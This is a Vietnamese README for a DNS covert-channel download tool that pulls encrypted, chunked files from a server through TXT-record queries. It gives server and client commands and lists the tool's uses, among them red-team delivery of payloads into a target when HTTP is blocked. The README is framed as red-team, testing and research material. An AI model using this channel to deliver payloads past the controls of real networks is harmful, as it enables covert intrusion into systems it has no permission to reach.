# DNS Downloader

Công cụ download file qua DNS covert channel. Ngược lại với DNSExfiltrator - thay vì upload/exfiltrate, tool này cho phép download file từ server về client thông qua DNS TXT records.

## Cơ chế hoạt động

```
┌─────────────────────────────────────────────────────────────┐
│  CLIENT                                  SERVER             │
├─────────────────────────────────────────────────────────────┤
│  1. Query: init.domain.com                                  │
│     ├─> Response: TXT "filename|chunks|encoding|checksum"  │
│                                                              │
│  2. Query: chunk-0.<random>.domain.com                      │
│     ├─> Response: TXT "base64_data_chunk_0"                │
│                                                              │
│  3. Query: chunk-1.<random>.domain.com                      │
│     ├─> Response: TXT "base64_data_chunk_1"                │
│     ...                                                      │
│                                                              │
│  N. Ghép chunks → Decode → Decrypt (RC4) → Unzip → Save    │
└─────────────────────────────────────────────────────────────┘
```

## Cài đặt

```bash
pip install -r requirements.txt
```

## Sử dụng

### Server (máy cung cấp file)

```bash
# Chạy với quyền root (port 53)
sudo python3 dns_server.py -d yourdomain.com -f /path/to/file -p password

# Tùy chọn
sudo python3 dns_server.py \
    -d yourdomain.com \
    -f /path/to/file \
    -p password \
    -b32              # Dùng Base32 thay vì Base64URL
    -c 150            # Chunk size (default: 200)
    -P 5353           # Port khác (default: 53)
```

### Client (máy download file)

```bash
python3 dns_downloader.py -d yourdomain.com -p password

# Tùy chọn
python3 dns_downloader.py \
    -d yourdomain.com \
    -p password \
    -s 192.168.1.100  # DNS server IP (nếu không dùng system DNS)
    -P 5353           # Port (nếu khác 53)
    -o output.txt     # Tên file output
    -t 100            # Delay giữa các request (ms)
    -r 5              # Số lần retry mỗi chunk
```

## Test local

### Terminal 1 - Server
```bash
# Tạo file test
echo "Hello from DNS Downloader!" > /tmp/test.txt

# Chạy server (port 5353 để không cần root)
python3 dns_server.py -d test.local -f /tmp/test.txt -p secret123 -P 5353
```

### Terminal 2 - Client
```bash
# Download file
python3 dns_downloader.py -d test.local -p secret123 -s 127.0.0.1 -P 5353 -o downloaded.txt

# Verify
cat downloaded.txt
```

## Tham số

### Server (dns_server.py)

| Tham số | Mô tả | Bắt buộc |
|---------|-------|----------|
| `-d, --domain` | Domain name | ✓ |
| `-f, --file` | File cần serve | ✓ |
| `-p, --password` | Password mã hóa | ✓ |
| `-b32, --base32` | Dùng Base32 encoding | |
| `-c, --chunk-size` | Kích thước chunk (default: 200) | |
| `-P, --port` | DNS port (default: 53) | |

### Client (dns_downloader.py)

| Tham số | Mô tả | Bắt buộc |
|---------|-------|----------|
| `-d, --domain` | Domain name | ✓ |
| `-p, --password` | Password giải mã | ✓ |
| `-s, --server` | DNS server IP | |
| `-P, --port` | DNS port (default: 53) | |
| `-o, --output` | Tên file output | |
| `-t, --throttle` | Delay giữa requests (ms) | |
| `-r, --retries` | Số lần retry mỗi chunk | |

## Đặc điểm

- **Mã hóa**: RC4 (tương thích với DNSExfiltrator)
- **Nén**: ZIP
- **Encoding**: Base64URL (default) hoặc Base32
- **Checksum**: Kiểm tra tính toàn vẹn file
- **DNS cache bypass**: Random nonce trong mỗi query
- **Retry**: Tự động retry khi chunk bị lỗi

## Use Cases

1. **Red Team**: Deliver payload vào target qua DNS khi HTTP/HTTPS bị chặn
2. **Security Testing**: Test khả năng detect DNS tunneling của tổ chức
3. **Research**: Nghiên cứu covert channel techniques

## Lưu ý

- Cần có authoritative DNS server hoặc truy cập trực tiếp đến server
- Với môi trường thực tế, cần setup NS record trỏ về server
- Tốc độ chậm hơn so với HTTP/FTP - phù hợp với file nhỏ/vừa
- DNS logging có thể detect pattern bất thường

## License

Educational/Research purposes only.

